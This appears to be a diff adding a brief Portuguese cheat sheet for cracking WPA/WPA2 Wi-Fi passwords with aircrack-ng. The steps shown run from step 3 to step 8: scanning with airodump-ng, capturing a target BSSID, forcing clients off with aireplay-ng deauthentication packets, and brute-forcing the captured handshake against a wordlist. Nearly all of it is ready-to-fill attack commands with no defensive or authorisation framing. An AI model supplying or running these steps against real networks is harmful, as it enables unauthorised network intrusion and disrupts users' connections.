@@ -1,0 +1,18 @@
+QUEBRANDO SENHAS DE CRIPTOGRAFIA WPA E WPA2 COM O AIRCRACK-NG.
+		
+	3.IDENTIFICAR A REDE:
+		airodump-ng nome_da_interface
+		
+	4.CAPTURAR A REDE ALVO E SALVAR EM UM ARQUIVO:
+		airodump-ng nome_interface -c canal -w nome_arquivo --bssid numero_bssid_alvo
+	
+	5.ENVIAR PACOTES DE DESAUTENTICAÇÃO:
+		aireplay-ng --deauth 1 -a numero_bssid_alvo nome_da_interface
+	
+	6. QUITAR DA CAPTURA:
+		CTROL + C
+		
+	7.ENTRAR NO DIRETÓRIO ONDE FOI SALVO OS ARQUIVOS.
+	
+	8.QUEBRAR SENHA:
+		aircrack-ng nome_arquivo -w caminho_de_um_wordlist 
